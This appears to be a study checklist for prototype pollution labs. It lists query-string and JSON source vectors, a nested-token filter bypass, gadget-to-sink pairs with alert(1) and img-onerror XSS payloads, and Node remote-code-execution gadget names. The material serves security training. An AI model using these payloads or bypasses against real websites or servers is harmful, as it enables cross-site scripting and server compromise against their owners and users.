# Prototype Pollution Checklist

## The three ingredients

Every prototype pollution attack needs all three:

1. **Source** - attacker-controllable input that reaches a recursive property assignment (URL query, JSON body, hash)
2. **Sink** - a function or DOM operation that does something dangerous with a property (`eval`, `script.src`, `innerHTML`, `setTimeout`, `child_process`)
3. **Gadget** - a property the app reads off an object expecting it to be undefined, which flows into the sink

## Client-side workflow

```
1. Confirm a source
   - /?__proto__[foo]=bar   then check Object.prototype.foo in console
   - If bracket fails, try dot:  /?__proto__.foo=bar        (Lab 3)
   - If __proto__ is filtered, try:  /?constructor[prototype][foo]=bar
   - If a filter strips __proto__ once, nest it: __pro__proto__to__   (Lab 4)

2. Find a gadget + sink
   - Let DOM Invader scan (enable Prototype pollution, click "Scan for gadgets")
   - Or read the loaded JS for an undefined property read off a config/manager object
   - Common gadgets: transport_url, sequence, hitCallback, html, value

3. Combine and fire alert()
   - transport_url -> script.src  ->  data:,alert(1)          (Labs 1, 4)
   - sequence -> eval(...)         ->  alert(1)-  (trailing operator)  (Labs 2, 3)
```

## Source vectors to try (in order)

| Vector | Syntax | When |
|--------|--------|------|
| Bracket + `__proto__` | `?__proto__[x]=y` | Default, try first |
| Dot + `__proto__` | `?__proto__.x=y` | Bracket did not pollute (Lab 3) |
| `constructor.prototype` | `?constructor[prototype][x]=y` | `__proto__` key is blocked |
| Nested `__proto__` | `?__pro__proto__to__[x]=y` | Filter strips `__proto__` non-recursively (Lab 4) |
| JSON body | `{"__proto__": {"x": "y"}}` | Server-side / JSON.parse + merge |

## Sink / gadget patterns

| Gadget property | Sink | Payload shape |
|-----------------|------|---------------|
| `transport_url` | `script.src` | `data:,alert(1)` |
| `sequence` | `eval` | `alert(1)-` (trailing operator) |
| `html` | `innerHTML` | `<img src=x onerror=alert(1)>` |
| `hitCallback` | called as function | direct function reference |

## Server-side notes

- No source to inspect in the browser - detect by observing side effects
- Send `"__proto__": {...}` inside JSON request bodies
- Detection: pollute a property, then look for it reflected in a JSON response or a changed behavior (e.g. an unexpected header, status code, or error)
- RCE gadgets in Node: `NODE_OPTIONS`, `--eval`, spawn argument arrays, `shell` in `child_process`
- Filters that strip `__proto__` from JSON keys can be bypassed with `constructor.prototype`

## Tips

- DOM Invader (Burp browser) auto-detects sources and gadgets - enable "Prototype pollution" in its settings
- Non-recursive string filters are defeated by nesting the token in itself (`__pro__proto__to__`)
- Always test both bracket and dot notation before giving up on a source
- Client-side labs are browser-only - the payload IS the exploit, no Python automation
- For the `eval`/`sequence` gadget, remember the app appends `1`, so end with an operator
